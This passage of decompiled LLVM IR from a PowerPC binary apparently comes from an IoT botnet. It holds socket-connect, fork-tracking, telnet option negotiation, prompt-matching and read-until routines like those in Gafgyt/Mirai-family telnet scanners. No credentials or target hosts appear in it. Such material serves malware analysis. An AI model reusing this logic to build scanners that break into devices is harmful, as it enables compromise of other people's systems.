  store i32 2, i32* %stack_var_-200, align 4
  %v1_100024a0 = urem i32 %arg3, 65536
  store i32 %v1_100024a0, i32* @r3, align 4
  %v1_100024a8 = call i32 @htons(i32 %v1_100024a0)
  %v2_100024b8 = ptrtoint i32* %stack_var_-200 to i32
  %v4_100024c8 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_100024b8)
  %v3_100024d0 = icmp eq i32 %v4_100024c8, 0
  br i1 %v3_100024d0, label %dec_label_pc_100024e4, label %dec_label_pc_100024d8

dec_label_pc_100024d8:                            ; preds = %entry
  br label %dec_label_pc_100026a4

dec_label_pc_100024e4:                            ; preds = %entry
  store i32 268444944, i32* @lr, align 4
  %v3_1000250c = call i32 @__libc_connect(i32 %arg1, i32 %v2_100024b8, i32 16)
  %tmp26 = icmp sgt i32 %v3_1000250c, -1
  br i1 %tmp26, label %dec_label_pc_10002660, label %dec_label_pc_10002524

dec_label_pc_10002524:                            ; preds = %dec_label_pc_100024e4
  %v0_10002524 = call i32 @__errno_location()
  %v1_1000252c = inttoptr i32 %v0_10002524 to i32*
  %v2_1000252c = load i32, i32* %v1_1000252c, align 4
  %v3_10002530 = icmp eq i32 %v2_1000252c, 115
  br i1 %v3_10002530, label %dec_label_pc_10002538, label %dec_label_pc_10002654

dec_label_pc_10002538:                            ; preds = %dec_label_pc_10002524
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_10002548 = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_10002548, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge

dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge: ; preds = %dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge.dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge_crit_edge, %dec_label_pc_10002538
  %v3_10002560.pre = phi i32 [ %v2_10002548, %dec_label_pc_10002538 ], [ %v3_10002560.pre.pre, %dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge.dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge_crit_edge ]
  %v1_1000257830 = phi i32 [ 1, %dec_label_pc_10002538 ], [ %v1_10002578, %dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge.dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge_crit_edge ]
  %v1_10002564 = mul nuw nsw i32 %v1_1000257830, 4
  %v2_10002568 = add i32 %v1_10002564, %v3_10002560.pre
  %v2_10002570 = inttoptr i32 %v2_10002568 to i32*
  store i32 0, i32* %v2_10002570, align 4
  %v1_10002578 = add nuw nsw i32 %v1_1000257830, 1
  %tmp27 = icmp ult i32 %v1_10002578, 32
  br i1 %tmp27, label %dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge.dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge_crit_edge, label %dec_label_pc_1000258c

dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge.dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge
  %v3_10002560.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge

dec_label_pc_1000258c:                            ; preds = %dec_label_pc_1000255c.dec_label_pc_1000255c_crit_edge
  %v1_10002590 = udiv i32 %arg1, 32
  %v1_10002598 = mul nuw nsw i32 %v1_10002590, 4
  %v2_1000259c = ptrtoint i32* %stack_var_-216 to i32
  %v2_100025a0 = add nuw nsw i32 %v1_10002598, 32
  %v1_100025a4 = add i32 %v2_100025a0, %v2_1000259c
  %v1_100025a8 = inttoptr i32 %v1_100025a4 to i32*
  %v2_100025a8 = load i32, i32* %v1_100025a8, align 4
  %v1_100025b0 = urem i32 %arg1, 32
  %v3_100025b8 = shl i32 1, %v1_100025b0
  %v2_100025bc = or i32 %v2_100025a8, %v3_100025b8
  store i32 %v2_100025bc, i32* %v1_100025a8, align 4
  %v1_100025d8 = add i32 %arg1, 1
  %v2_100025e0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268445180, i32* @lr, align 4
  %v5_100025f8 = call i32 @__libc_select(i32 %v1_100025d8, i32 0, i32 %v2_10002548, i32 0, i32 %v2_100025e0)
  %tmp28 = icmp slt i32 %v5_100025f8, 1
  br i1 %tmp28, label %dec_label_pc_10002648, label %dec_label_pc_10002608

dec_label_pc_10002608:                            ; preds = %dec_label_pc_1000258c
  store i32 4, i32* %stack_var_-48, align 4
  %v2_10002610 = ptrtoint i32* %stack_var_-44 to i32
  %v2_10002614 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268445232, i32* @lr, align 4
  %v5_1000262c = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_10002610, i32 %v2_10002614)
  %v3_10002630 = load i32, i32* %stack_var_-44, align 4
  %v3_10002634 = icmp eq i32 %v3_10002630, 0
  br i1 %v3_10002634, label %dec_label_pc_10002660, label %dec_label_pc_1000263c

dec_label_pc_1000263c:                            ; preds = %dec_label_pc_10002608
  br label %dec_label_pc_100026a4

dec_label_pc_10002648:                            ; preds = %dec_label_pc_1000258c
  br label %dec_label_pc_100026a4

dec_label_pc_10002654:                            ; preds = %dec_label_pc_10002524
  br label %dec_label_pc_100026a4

dec_label_pc_10002660:                            ; preds = %dec_label_pc_10002608, %dec_label_pc_100024e4
  store i32 268445300, i32* @lr, align 4
  %v2_10002670 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_10002680 = call i32 @__asm_rlwinm(i32 %v2_10002670, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_1000269c.41 to i32), i32* @lr, align 4
  %v2_10002698 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_100026a4

dec_label_pc_100026a4:                            ; preds = %dec_label_pc_10002654, %dec_label_pc_10002648, %dec_label_pc_1000263c, %dec_label_pc_100024d8, %dec_label_pc_10002660
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_10002660 ], [ 0, %dec_label_pc_10002648 ], [ 0, %dec_label_pc_1000263c ], [ 0, %dec_label_pc_10002654 ], [ 0, %dec_label_pc_100024d8 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_10002578, { 1, 0 }
  uselistorder i32 %v2_10002548, { 1, 0, 2 }
  uselistorder i32 %v2_100024b8, { 1, 0 }
  uselistorder i32 %v1_100024a0, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_100026a4, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268445404, i32* @lr, align 4
  %v0_100026d8 = call i32 @__libc_fork()
  %v3_100026e8 = icmp eq i32 %v0_100026d8, 0
  br i1 %v3_100026e8, label %dec_label_pc_1000286c, label %dec_label_pc_100026fc

dec_label_pc_100026fc:                            ; preds = %entry
  %v3_10002704 = load i32, i32* @global_var_1002351c.43, align 4
  %v2_10002708 = load i32, i32* @global_var_10023518.42, align 4
  %v1_1000270c = add i32 %v3_10002704, 1
  %v2_1000270c = icmp eq i32 %v3_10002704, -1
  %v2_10002710 = zext i1 %v2_1000270c to i32
  %v3_10002710 = add i32 %v2_10002710, %v2_10002708
  store i32 %v3_10002710, i32* @global_var_10023518.42, align 4
  store i32 %v1_1000270c, i32* @global_var_1002351c.43, align 4
  %v1_10002740 = mul i32 %v1_1000270c, 4
  %v1_10002748 = add i32 %v1_10002740, 4
  store i32 %v1_10002748, i32* @r3, align 4
  store i32 268445524, i32* @lr, align 4
  %v0_10002750 = call i32 @malloc()
  br label %dec_label_pc_100027a8

dec_label_pc_10002768:                            ; preds = %dec_label_pc_100027a8, %dec_label_pc_100027f8
  %v1_1000276c = mul i32 %storemerge2, 4
  %v2_10002778 = add i32 %v1_1000276c, %v0_10002750
  %v3_1000278c = load i32, i32* @global_var_10023544.44, align 4
  %v2_10002790 = add i32 %v3_1000278c, %v1_1000276c
  %v1_10002794 = inttoptr i32 %v2_10002790 to i32*
  %v2_10002794 = load i32, i32* %v1_10002794, align 4
  %v2_10002798 = inttoptr i32 %v2_10002778 to i32*
  store i32 %v2_10002794, i32* %v2_10002798, align 4
  %v1_100027a0 = add i32 %storemerge2, 1
  br label %dec_label_pc_100027a8

dec_label_pc_100027a8:                            ; preds = %dec_label_pc_100026fc, %dec_label_pc_10002768
  %storemerge2 = phi i32 [ 0, %dec_label_pc_100026fc ], [ %v1_100027a0, %dec_label_pc_10002768 ]
  %v3_100027d0 = load i32, i32* @global_var_1002351c.43, align 4
  %v2_100027d4 = load i32, i32* @global_var_10023518.42, align 4
  %v2_100027d8 = icmp ne i32 %v3_100027d0, 0
  %v3_100027dc = add i32 %v2_100027d4, -1
  %v4_100027dc = sext i1 %v2_100027d8 to i32
  %v3_100027f0 = icmp eq i32 %v3_100027dc, %v4_100027dc
  br i1 %v3_100027f0, label %dec_label_pc_100027f8, label %dec_label_pc_10002768

dec_label_pc_100027f8:                            ; preds = %dec_label_pc_100027a8
  %v1_100027d8 = add i32 %v3_100027d0, -1
  %v3_10002810 = icmp ugt i32 %v1_100027d8, %storemerge2
  br i1 %v3_10002810, label %dec_label_pc_10002768, label %dec_label_pc_10002818

dec_label_pc_10002818:                            ; preds = %dec_label_pc_100027f8
  %v1_1000282c = mul i32 %v3_100027d0, 4
  %v2_10002838 = add i32 %v0_10002750, -4
  %v1_1000283c = add i32 %v2_10002838, %v1_1000282c
  %v2_10002844 = inttoptr i32 %v1_1000283c to i32*
  store i32 %v0_100026d8, i32* %v2_10002844, align 4
  %v3_1000284c = load i32, i32* @global_var_10023544.44, align 4
  store i32 %v3_1000284c, i32* @r3, align 4
  store i32 268445784, i32* @lr, align 4
  %v0_10002854 = call i32 @free()
  store i32 %v0_10002750, i32* @global_var_10023544.44, align 4
  br label %dec_label_pc_1000286c

dec_label_pc_1000286c:                            ; preds = %entry, %dec_label_pc_10002818
  ret i32 %v0_100026d8

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_1000276c, { 1, 0 }
  uselistorder i32 %v0_10002750, { 1, 2, 0 }
  uselistorder i32 %v3_10002704, { 1, 0 }
  uselistorder label %dec_label_pc_1000286c, { 1, 0 }
  uselistorder label %dec_label_pc_100027a8, { 1, 0 }
  uselistorder label %dec_label_pc_10002768, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_100028b0 = add i32 %arg2, 1
  %v1_100028b4 = inttoptr i32 %v1_100028b0 to i8*
  %v2_100028b4 = load i8, i8* %v1_100028b4, align 1
  %v1_100028c4 = icmp ult i8 %v2_100028b4, -5
  br i1 %v1_100028c4, label %dec_label_pc_10002a1c, label %dec_label_pc_100028cc

dec_label_pc_100028cc:                            ; preds = %entry
  %v2_100028d0 = icmp eq i8 %v2_100028b4, -1
  br i1 %v2_100028d0, label %dec_label_pc_100028d8, label %dec_label_pc_100028f4

dec_label_pc_100028d8:                            ; preds = %dec_label_pc_100028cc
  br label %dec_label_pc_10002a1c

dec_label_pc_100028f4:                            ; preds = %dec_label_pc_100028cc
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_10002900 = ptrtoint i8* %stack_var_-56 to i32
  store i32 268445972, i32* @lr, align 4
  %v4_10002910 = call i32 @__libc_send(i32 %arg1, i32 %v2_10002900, i32 1, i32 16384)
  %v2_1000291c = load i8, i8* %v1_100028b4, align 1
  %v3_10002924 = icmp eq i8 %v2_1000291c, -4
  br i1 %v3_10002924, label %dec_label_pc_1000292c, label %dec_label_pc_10002938

dec_label_pc_1000292c:                            ; preds = %dec_label_pc_100028f4
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029e0

dec_label_pc_10002938:                            ; preds = %dec_label_pc_100028f4
  %v2_10002940 = load i8, i8* %v1_100028b4, align 1
  %v3_10002948 = icmp eq i8 %v2_10002940, -2
  br i1 %v3_10002948, label %dec_label_pc_10002950, label %dec_label_pc_1000295c

dec_label_pc_10002950:                            ; preds = %dec_label_pc_10002938
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029e0

dec_label_pc_1000295c:                            ; preds = %dec_label_pc_10002938
  %v2_10002964 = load i8, i8* %v1_100028b4, align 1
  %v3_1000296c = icmp eq i8 %v2_10002964, 3
  br i1 %v3_1000296c, label %dec_label_pc_10002974, label %dec_label_pc_100029ac

dec_label_pc_10002974:                            ; preds = %dec_label_pc_1000295c
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029e0

dec_label_pc_100029ac:                            ; preds = %dec_label_pc_1000295c
  %v3_10002984 = icmp eq i8 %v2_10002964, -3
  %.7 = select i1 %v3_10002984, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029e0

dec_label_pc_100029e0:                            ; preds = %dec_label_pc_10002974, %dec_label_pc_10002950, %dec_label_pc_1000292c, %dec_label_pc_100029ac
  store i32 268446200, i32* @lr, align 4
  %v4_100029f4 = call i32 @__libc_send(i32 %arg1, i32 %v2_10002900, i32 1, i32 16384)
  %v1_100029fc = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_10002a14.45 to i32), i32* @lr, align 4
  %v4_10002a10 = call i32 @__libc_send(i32 %arg1, i32 %v1_100029fc, i32 1, i32 16384)
  br label %dec_label_pc_10002a1c

dec_label_pc_10002a1c:                            ; preds = %dec_label_pc_100028d8, %dec_label_pc_100029e0, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_10002a1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100029e0, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10002a68 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_10011064.46 to i32), i32* @r3, align 4
  %v0_10002ba410 = call i32 @__GI_strlen()
  %v2_10002bac12 = icmp eq i32 %v0_10002ba410, 0
  br i1 %v2_10002bac12, label %dec_label_pc_10002bbc, label %dec_label_pc_10002a94.preheader.lr.ph

dec_label_pc_10002a94.preheader.lr.ph:            ; preds = %entry
  %v2_10002ab0 = add i32 %v0_10002a68, %arg1
  br label %dec_label_pc_10002a94.preheader

dec_label_pc_10002a88:                            ; preds = %dec_label_pc_10002b1c, %dec_label_pc_10002af4, %dec_label_pc_10002acc, %dec_label_pc_10002aa4
  %v1_10002a8c = add nsw i32 %stack_var_-40.08, 1
  %v3_10002a9c = icmp sgt i32 %v0_10002a68, %v1_10002a8c
  br i1 %v3_10002a9c, label %dec_label_pc_10002aa4, label %dec_label_pc_10002b44

dec_label_pc_10002aa4:                            ; preds = %dec_label_pc_10002a94.preheader, %dec_label_pc_10002a88
  %stack_var_-40.08 = phi i32 [ %v1_10002a8c, %dec_label_pc_10002a88 ], [ %stack_var_-40.115, %dec_label_pc_10002a94.preheader ]
  %v2_10002ab8 = sub i32 %v2_10002ab0, %stack_var_-40.08
  %v1_10002abc = inttoptr i32 %v2_10002ab8 to i8*
  %v2_10002abc = load i8, i8* %v1_10002abc, align 1
  %v3_10002ac4 = icmp eq i8 %v2_10002abc, 0
  br i1 %v3_10002ac4, label %dec_label_pc_10002a88, label %dec_label_pc_10002acc

dec_label_pc_10002acc:                            ; preds = %dec_label_pc_10002aa4
  %v2_10002ae4 = load i8, i8* %v1_10002abc, align 1
  %v3_10002aec = icmp eq i8 %v2_10002ae4, 32
  br i1 %v3_10002aec, label %dec_label_pc_10002a88, label %dec_label_pc_10002af4

dec_label_pc_10002af4:                            ; preds = %dec_label_pc_10002acc
  %v2_10002b0c = load i8, i8* %v1_10002abc, align 1
  %v3_10002b14 = icmp eq i8 %v2_10002b0c, 13
  br i1 %v3_10002b14, label %dec_label_pc_10002a88, label %dec_label_pc_10002b1c

dec_label_pc_10002b1c:                            ; preds = %dec_label_pc_10002af4
  %v2_10002b34 = load i8, i8* %v1_10002abc, align 1
  %v3_10002b3c = icmp eq i8 %v2_10002b34, 10
  br i1 %v3_10002b3c, label %dec_label_pc_10002a88, label %dec_label_pc_10002b44

dec_label_pc_10002b44:                            ; preds = %dec_label_pc_10002b1c, %dec_label_pc_10002a88, %dec_label_pc_10002a94.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002a94.preheader ], [ %stack_var_-40.08, %dec_label_pc_10002b1c ], [ %v1_10002a8c, %dec_label_pc_10002a88 ]
  %v2_10002b58 = sub i32 %v2_10002ab0, %stack_var_-40.0.lcssa
  %v1_10002b5c = inttoptr i32 %v2_10002b58 to i8*
  %v2_10002b5c = load i8, i8* %v1_10002b5c, align 1
  %v2_10002b70 = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_10011064.46 to i32)
  %v1_10002b74 = inttoptr i32 %v2_10002b70 to i8*
  %v2_10002b74 = load i8, i8* %v1_10002b74, align 1
  %v4_10002b7c = icmp eq i8 %v2_10002b5c, %v2_10002b74
  br i1 %v4_10002b7c, label %dec_label_pc_10002bbc, label %dec_label_pc_10002b90

dec_label_pc_10002b90:                            ; preds = %dec_label_pc_10002b44
  %v1_10002b94 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_10011064.46 to i32), i32* @r3, align 4
  %v0_10002ba4 = call i32 @__GI_strlen()
  %v2_10002bac = icmp ult i32 %v1_10002b94, %v0_10002ba4
  br i1 %v2_10002bac, label %dec_label_pc_10002a94.preheader, label %dec_label_pc_10002bbc

dec_label_pc_10002a94.preheader:                  ; preds = %dec_label_pc_10002a94.preheader.lr.ph, %dec_label_pc_10002b90
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002a94.preheader.lr.ph ], [ %v1_10002b94, %dec_label_pc_10002b90 ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002a94.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_10002b90 ]
  %v3_10002a9c6 = icmp sgt i32 %v0_10002a68, %stack_var_-40.115
  br i1 %v3_10002a9c6, label %dec_label_pc_10002aa4, label %dec_label_pc_10002b44

dec_label_pc_10002bbc:                            ; preds = %entry, %dec_label_pc_10002b44, %dec_label_pc_10002b90
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_10002b44 ], [ 0, %dec_label_pc_10002b90 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_10002b94, { 1, 0 }
  uselistorder i32 %v0_10002a68, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_10011064.46 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002bbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002a94.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002b44, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10002c10 = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_10002e505 = add i32 %v0_10002c10, 2
  %v2_10002e586 = icmp slt i32 %v1_10002e505, %arg7
  br i1 %v2_10002e586, label %dec_label_pc_10002e60.lr.ph, label %dec_label_pc_10002e90

dec_label_pc_10002e60.lr.ph:                      ; preds = %entry
  %v2_10002c48 = ptrtoint i32* %stack_var_-192 to i32
  %v1_10002c90 = udiv i32 %arg1, 32
  %v1_10002c98 = mul nuw nsw i32 %v1_10002c90, 4
  %v2_10002c9c = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002ca0 = add nuw nsw i32 %v1_10002c98, 24
  %v1_10002ca4 = add i32 %v2_10002ca0, %v2_10002c9c
  %v1_10002ca8 = inttoptr i32 %v1_10002ca4 to i32*
  %v1_10002cb0 = urem i32 %arg1, 32
  %v3_10002cb8 = shl i32 1, %v1_10002cb0
  %v1_10002cd8 = add i32 %arg1, 1
  %v2_10002ce0 = ptrtoint i32* %stack_var_-64 to i32
  %v4_10002e10 = inttoptr i32 %arg2 to i8*
  %v3_10002e24 = icmp eq i32 %arg3, 0
  %v2_10002e70 = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_10002e60

dec_label_pc_10002c48:                            ; preds = %dec_label_pc_10002e6c, %dec_label_pc_10002e60
  store i32 %v2_10002c48, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge

dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge: ; preds = %dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge.dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge_crit_edge, %dec_label_pc_10002c48
  %v3_10002c60.pre = phi i32 [ %v2_10002c48, %dec_label_pc_10002c48 ], [ %v3_10002c60.pre.pre, %dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge.dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge_crit_edge ]
  %v1_10002c7836 = phi i32 [ 1, %dec_label_pc_10002c48 ], [ %v1_10002c78, %dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge.dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge_crit_edge ]
  %v1_10002c64 = mul nuw nsw i32 %v1_10002c7836, 4
  %v2_10002c68 = add i32 %v1_10002c64, %v3_10002c60.pre
  %v2_10002c70 = inttoptr i32 %v2_10002c68 to i32*
  store i32 0, i32* %v2_10002c70, align 4
  %v1_10002c78 = add nuw nsw i32 %v1_10002c7836, 1
  %tmp33 = icmp ult i32 %v1_10002c78, 32
  br i1 %tmp33, label %dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge.dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge_crit_edge, label %dec_label_pc_10002c8c

dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge.dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge_crit_edge: ; preds = %dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge
  %v3_10002c60.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge

dec_label_pc_10002c8c:                            ; preds = %dec_label_pc_10002c5c.dec_label_pc_10002c5c_crit_edge
  %v2_10002ca8 = load i32, i32* %v1_10002ca8, align 4
  %v2_10002cbc = or i32 %v2_10002ca8, %v3_10002cb8
  store i32 %v2_10002cbc, i32* %v1_10002ca8, align 4
  store i32 268446972, i32* @lr, align 4
  %v5_10002cf8 = call i32 @__libc_select(i32 %v1_10002cd8, i32 %v2_10002c48, i32 0, i32 0, i32 %v2_10002ce0)
  %tmp34 = icmp slt i32 %v5_10002cf8, 1
  br i1 %tmp34, label %dec_label_pc_10002e90, label %dec_label_pc_10002d08

dec_label_pc_10002d08:                            ; preds = %dec_label_pc_10002c8c
  %v2_10002d14 = add i32 %stack_var_-196.09, %arg6
  store i32 268447024, i32* @lr, align 4
  %v4_10002d2c = call i32 @__libc_recv(i32 %arg1, i32 %v2_10002d14, i32 1, i32 0)
  %v4_10002d40 = icmp eq i32 %v4_10002d2c, -1
  br i1 %v4_10002d40, label %dec_label_pc_10002d54, label %dec_label_pc_10002d48

dec_label_pc_10002d48:                            ; preds = %dec_label_pc_10002d08
  %v3_10002d4c = icmp eq i32 %v4_10002d2c, 0
  br i1 %v3_10002d4c, label %dec_label_pc_10002d54, label %dec_label_pc_10002d60

dec_label_pc_10002d54:                            ; preds = %dec_label_pc_10002d48, %dec_label_pc_10002d08
  br label %dec_label_pc_10002e98

dec_label_pc_10002d60:                            ; preds = %dec_label_pc_10002d48
  %v2_10002d68 = add i32 %v4_10002d2c, %stack_var_-196.09
  %v4_10002d70 = inttoptr i32 %v2_10002d14 to i8*
  %v3_10002d74 = load i8, i8* %v4_10002d70, align 1
  %v3_10002d7c = icmp eq i8 %v3_10002d74, -1
  br i1 %v3_10002d7c, label %dec_label_pc_10002d84, label %dec_label_pc_10002e08

dec_label_pc_10002d84:                            ; preds = %dec_label_pc_10002d60
  %v1_10002d88 = add i32 %v2_10002d14, 1
  store i32 268447136, i32* @lr, align 4
  %v4_10002d9c = call i32 @__libc_recv(i32 %arg1, i32 %v1_10002d88, i32 2, i32 0)
  %v4_10002db0 = icmp eq i32 %v4_10002d9c, -1
  br i1 %v4_10002db0, label %dec_label_pc_10002dc4, label %dec_label_pc_10002db8

dec_label_pc_10002db8:                            ; preds = %dec_label_pc_10002d84
  %v3_10002dbc = icmp eq i32 %v4_10002d9c, 0
  br i1 %v3_10002dbc, label %dec_label_pc_10002dc4, label %dec_label_pc_10002dd0

dec_label_pc_10002dc4:                            ; preds = %dec_label_pc_10002db8, %dec_label_pc_10002d84
  br label %dec_label_pc_10002e98

dec_label_pc_10002dd0:                            ; preds = %dec_label_pc_10002db8
  %v2_10002dd8 = add i32 %v4_10002d9c, %v2_10002d68
  store i32 268447216, i32* @lr, align 4
  %v4_10002dec = call i32 @negotiate(i32 %arg1, i32 %v2_10002d14, i32 3, i32 %v2_10002d68)
  %v3_10002df4 = icmp eq i32 %v4_10002dec, 0
  br i1 %v3_10002df4, label %dec_label_pc_10002dfc, label %dec_label_pc_10002e4c.backedge

dec_label_pc_10002dfc:                            ; preds = %dec_label_pc_10002dd0
  br label %dec_label_pc_10002e98

dec_label_pc_10002e08:                            ; preds = %dec_label_pc_10002d60
  store i32 268447252, i32* @lr, align 4
  %v5_10002e10 = call i32 @strstr(i32 %arg6, i8* %v4_10002e10, i32 %v2_10002d14)
  %v3_10002e18 = icmp eq i32 %v5_10002e10, 0
  br i1 %v3_10002e18, label %dec_label_pc_10002e20, label %dec_label_pc_10002e84

dec_label_pc_10002e20:                            ; preds = %dec_label_pc_10002e08
  br i1 %v3_10002e24, label %dec_label_pc_10002e4c.backedge, label %dec_label_pc_10002e2c

dec_label_pc_10002e4c.backedge:                   ; preds = %dec_label_pc_10002e20, %dec_label_pc_10002e2c, %dec_label_pc_10002dd0
  %stack_var_-196.0.be = phi i32 [ %v2_10002dd8, %dec_label_pc_10002dd0 ], [ %v2_10002d68, %dec_label_pc_10002e20 ], [ %v2_10002d68, %dec_label_pc_10002e2c ]
  %v1_10002e50 = add i32 %stack_var_-196.0.be, 2
  %v2_10002e58 = icmp slt i32 %v1_10002e50, %arg7
  br i1 %v2_10002e58, label %dec_label_pc_10002e4c.backedge.dec_label_pc_10002e60_crit_edge, label %dec_label_pc_10002e90

dec_label_pc_10002e4c.backedge.dec_label_pc_10002e60_crit_edge: ; preds = %dec_label_pc_10002e4c.backedge
  %v3_10002e60.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_10002e60

dec_label_pc_10002e2c:                            ; preds = %dec_label_pc_10002e20
  %v1_10002e30 = call i32 @matchPrompt(i32 %arg6)
  %v3_10002e38 = icmp eq i32 %v1_10002e30, 0
  br i1 %v3_10002e38, label %dec_label_pc_10002e4c.backedge, label %dec_label_pc_10002e84

dec_label_pc_10002e60:                            ; preds = %dec_label_pc_10002e4c.backedge.dec_label_pc_10002e60_crit_edge, %dec_label_pc_10002e60.lr.ph
  %v3_10002e60 = phi i32 [ %arg4, %dec_label_pc_10002e60.lr.ph ], [ %v3_10002e60.pre, %dec_label_pc_10002e4c.backedge.dec_label_pc_10002e60_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10002c10, %dec_label_pc_10002e60.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10002e4c.backedge.dec_label_pc_10002e60_crit_edge ]
  %v2_10002e64 = icmp sgt i32 %v3_10002e60, 0
  br i1 %v2_10002e64, label %dec_label_pc_10002c48, label %dec_label_pc_10002e6c

dec_label_pc_10002e6c:                            ; preds = %dec_label_pc_10002e60
  br i1 %v2_10002e70, label %dec_label_pc_10002c48, label %dec_label_pc_10002e90

dec_label_pc_10002e84:                            ; preds = %dec_label_pc_10002e08, %dec_label_pc_10002e2c
  br label %dec_label_pc_10002e98

dec_label_pc_10002e90:                            ; preds = %dec_label_pc_10002e4c.backedge, %dec_label_pc_10002e6c, %dec_label_pc_10002c8c, %entry
  br label %dec_label_pc_10002e98

dec_label_pc_10002e98:                            ; preds = %dec_label_pc_10002e84, %dec_label_pc_10002dfc, %dec_label_pc_10002dc4, %dec_label_pc_10002d54, %dec_label_pc_10002e90
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10002e90 ], [ 1, %dec_label_pc_10002e84 ], [ 0, %dec_label_pc_10002d54 ], [ 0, %dec_label_pc_10002dc4 ], [ 0, %dec_label_pc_10002dfc ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
